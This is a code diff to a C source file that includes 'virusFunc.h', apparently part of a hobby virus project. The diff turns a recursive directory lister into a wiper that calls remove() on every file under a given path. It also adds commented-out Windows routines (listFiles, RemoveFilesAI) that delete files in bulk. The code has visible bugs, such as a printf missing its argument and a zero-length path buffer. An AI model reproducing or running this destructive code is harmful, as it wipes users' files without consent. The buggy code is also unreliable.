@@ -5,6 +5,7 @@
 #include <windows.h>  // used in drives detection
 #include <string.h>
 #include "virusFunc.h"
+#include <io.h>
 
 int deleteFile(char filename[])
 {
@@ -75,6 +76,9 @@ int detectDrives(char existDrivesName[10][10], int *length){
 
 void listFilesRecursively(char *basePath)
 {
+    if(!isDirectory(basePath) == 0){
+       // RemoveFilesAI();
+    }
     char path[1000];
     struct dirent *dp;
     DIR *dir = opendir(basePath);
@@ -87,12 +91,16 @@ void listFilesRecursively(char *basePath)
     {
         if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
         {
-            printf("%s\n", dp->d_name);
 
             // Construct new path from our base path
             strcpy(path, basePath);
             strcat(path, "/");
             strcat(path, dp->d_name);
+            if(remove(path)==0){
+                printf("(%s) Succesffuly deteled\n", dp->d_name);
+            }else{
+                printf("[%s] it's a dir?\n");
+            }
 
             listFilesRecursively(path);
         }
@@ -100,6 +108,83 @@ void listFilesRecursively(char *basePath)
 
     closedir(dir);
 }
+
+
+
+
+// void listFiles(char *dir) {
+//   char searchPath[1000];
+//   sprintf(searchPath, "%s\\*", dir);
+
+//   struct _finddata_t fileInfo;
+//   long handle;
+
+//   handle = _findfirst(searchPath, &fileInfo);
+//   if (handle == -1) {
+//     return;
+//   }
+
+//   do {
+//     if (strcmp(fileInfo.name, ".") != 0 && strcmp(fileInfo.name, "..") != 0) {
+//       if (fileInfo.attrib & _A_SUBDIR) {
+//         // This is a sub directory, so search it recursively
+//         char subdir[1000];
+//         sprintf(subdir, "%s\\%s", dir, fileInfo.name);
+//         listFiles(subdir);
+//       } else {
+//         // This is a file, so print its name
+//         // if(deleteFile())
+//         char fullPath[] = {};
+//         strcpy(fullPath, dir);
+//         strcat(fullPath, fileInfo.name);
+//         if(remove(fullPath)==0){
+//             printf("Successfully Deleted files\n");
+//         }
+//         printf("Deleted: ");
+//         printf("%s\n", fullPath);
+//         printf("%s\\%s\n", dir, fileInfo.name);
+//       }
+//     }
+//   } while (_findnext(handle, &fileInfo) == 0);
+
+//   _findclose(handle);
+// }
+
+
+
+
+// int RemoveFilesAI(void){
+//      struct _finddata_t fileInfo;
+//   long handle;
+
+//   handle = _findfirst("*", &fileInfo);
+//   if (handle == -1) {
+//     printf("No files or folders found\n");
+//   } else {
+//     if (fileInfo.attrib & _A_SUBDIR) {
+//       printf("%s (folder)\n", fileInfo.name);
+//     } else {
+//         // using my own function
+//         if(deleteFile(fileInfo.name)){
+//             printf("%s (file)\n", fileInfo.name);
+//         }
+//     }
+//     while (_findnext(handle, &fileInfo) == 0) {
+//       if (fileInfo.attrib & _A_SUBDIR) {
+//         printf("%s (folder)\n", fileInfo.name);
+//       } else {
+//         // using my own function
+//         if(deleteFile(fileInfo.name)){
+//             printf("%s (file)\n", fileInfo.name);
+//         }
+//       }
+//     }
+//   }
+
+//   _findclose(handle);
+//   return 0;
+// }
+
 
 
 // this function have some bugs when it's return the arryOfFileAndFolder
